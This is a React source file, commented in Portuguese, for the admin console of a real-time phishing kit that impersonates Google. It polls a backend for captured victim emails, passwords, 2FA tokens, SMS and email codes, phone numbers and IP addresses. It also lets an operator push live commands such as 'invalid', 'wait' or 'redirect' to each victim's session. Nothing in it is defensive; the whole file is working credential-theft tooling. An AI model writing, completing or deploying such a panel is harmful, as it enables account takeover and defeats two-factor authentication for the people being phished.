import { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function AdminPanel() {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
  const navigate = useNavigate();

  useEffect(() => {
    fetchLoginAttempts();
    const interval = setInterval(fetchLoginAttempts, 3000);
    return () => clearInterval(interval);
  }, []);

  const getAuthHeaders = () => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      navigate("/donas/login");
      return null;
    }
    return { Authorization: `Bearer ${token}` };
  };

  const fetchLoginAttempts = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const response = await axios.get(`${API}/admin/login-attempts`, { headers });
      setLoginAttempts(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Erro ao buscar tentativas:", error);
      if (error.response?.status === 401) {
        localStorage.removeItem("admin_token");
        navigate("/donas/login");
      }
    }
  };

  const sendCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const payload = {
        user_id: userId,
        command: command,
      };

      if (command === "REDIRECT") {
        payload.redirect_url = redirectUrl;
      }

      await axios.post(`${API}/admin/command`, payload, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  const updateStatus = async (userId, status) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja limpar todas as tentativas?")) {
      return;
    }

    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/clear-all`, {}, { headers });
      setLoginAttempts([]);
    } catch (error) {
      console.error("Erro ao limpar:", error);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    navigate("/donas/login");
  };

  const filteredAttempts = loginAttempts.filter((attempt) =>
    attempt.email.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-gradient-to-r from-purple-600 to-purple-700 shadow-lg">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-2 flex-wrap">
              <button className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                TXT
              </button>
              <button className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                PDF
              </button>
              <button className="bg-blue-400 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                Telegram
              </button>
              <button
                onClick={handleClearAll}
                className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
              >
                Limpar Tudo
              </button>
              <button
                onClick={fetchLoginAttempts}
                className="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
              >
                Atualizar
              </button>
              <button className="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                Exibir Visitantes
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img
                src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
                alt="Google"
                className="h-8"
              />
              <button
                onClick={handleLogout}
                className="bg-white text-purple-600 px-4 py-2 rounded text-sm font-medium hover:bg-gray-100 transition-colors"
              >
                Sair
              </button>
              <button className="bg-yellow-400 text-black px-4 py-2 rounded text-sm font-bold hover:bg-yellow-500 transition-colors">
                DONAS
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <div className="container mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Search */}
          <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Campo de referência:
              </label>
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Ex: final do telefone, nome..."
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Site de Redirecionamento (Comando X):
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  placeholder="https://business.google.com/"
                  className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>
            </div>
          </div>

          {/* Loading */}
          {loading ? (
            <div className="text-center py-12">
              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600"></div>
              <p className="mt-4 text-gray-600">Carregando...</p>
            </div>
          ) : filteredAttempts.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
            </div>
          ) : (
            <div className="space-y-6">
              {filteredAttempts.map((attempt, index) => (
                <div key={attempt.id} className="border border-gray-200 rounded-lg overflow-hidden shadow-sm">
                  {/* Header com email e número de tentativas */}
                  <div className="bg-gradient-to-r from-blue-400 to-blue-500 px-4 py-3 text-white">
                    <h3 className="font-bold text-lg">{attempt.email} ({index + 1} tentativa)</h3>
                  </div>

                  {/* Tabela */}
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr>
                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">#</th>
                          <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">status</th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "INV")}
                            className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-purple-200 transition-colors"
                          >
                            INV
                          </th>
                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">USUÁRIO/LOGIN</th>
                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">SENHA</th>
                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">AUT</th>
                          <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">EMAIL</th>
                          <th className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-TEL</th>
                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">Nº TELEFONE</th>
                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-MAIL</th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "AGUARDE")}
                            className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-yellow-200 transition-colors"
                          >
                            👍
                          </th>
                          <th 
                            onClick={() => sendCommand(attempt.id, "REDIRECT")}
                            className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-pink-200 transition-colors"
                          >
                            X
                          </th>
                          <th className="bg-gray-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">🗑️</th>
                        </tr>
                      </thead>
                      <tbody>
                        {/* Única linha de dados */}
                        <tr className="bg-white">
                          {/* # */}
                          <td className="px-3 py-3 text-center text-sm font-bold border border-gray-300">{index + 1}</td>
                          
                          {/* status - bolinha clicável */}
                          <td className="px-3 py-3 text-center border border-gray-300">
                            <button
                              onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
                              className="inline-flex items-center justify-center"
                            >
                              <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
                            </button>
                          </td>
                          
                          {/* INV - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-gray-300">
                            <span className="text-gray-700">-</span>
                          </td>
                          
                          {/* USUÁRIO/LOGIN - valor fixo */}
                          <td className="px-3 py-3 text-sm border border-gray-300 font-medium">{attempt.email}</td>
                          
                          {/* SENHA - valor fixo */}
                          <td className="px-3 py-3 text-sm border border-gray-300">{attempt.password || "-"}</td>
                          
                          {/* AUT - campo esperando dado */}
                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
                            <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
                          </td>
                          
                          {/* EMAIL - campo esperando dado */}
                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
                            <span className="text-gray-700">{attempt.email_input || "-"}</span>
                          </td>
                          
                          {/* TOK-TEL - campo esperando dado */}
                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
                            <span className="text-gray-700">{attempt.sms_code || "-"}</span>
                          </td>
                          
                          {/* Nº TELEFONE - campo esperando dado */}
                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
                            <span className="text-gray-700">{attempt.phone_number || "-"}</span>
                          </td>
                          
                          {/* TOK-MAIL - campo esperando dado */}
                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
                            <span className="text-gray-700">{attempt.app_mail || "-"}</span>
                          </td>
                          
                          {/* 👍 - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-gray-300">
                            <span className="text-gray-700">-</span>
                          </td>
                          
                          {/* X - apenas header, célula vazia */}
                          <td className="px-3 py-3 text-center border border-gray-300">
                            <span className="text-gray-700">-</span>
                          </td>
                          
                          {/* 🗑️ - lixeira clicável */}
                          <td className="px-3 py-3 text-center border border-gray-300">
                            <button
                              onClick={() => handleDelete(attempt.id)}
                              className="text-gray-600 hover:text-gray-800 text-xl transition-colors"
                            >
                              🗑️
                            </button>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>

                  {/* Footer com informações */}
                  <div className="bg-gray-50 px-4 py-3 text-xs text-gray-600 border-t border-gray-200">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                      <div><span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}</div>
                      <div><span className="font-semibold">🌍 País:</span> {attempt.country || "-"}</div>
                      <div><span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}</div>
                      <div><span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}</div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default AdminPanel;
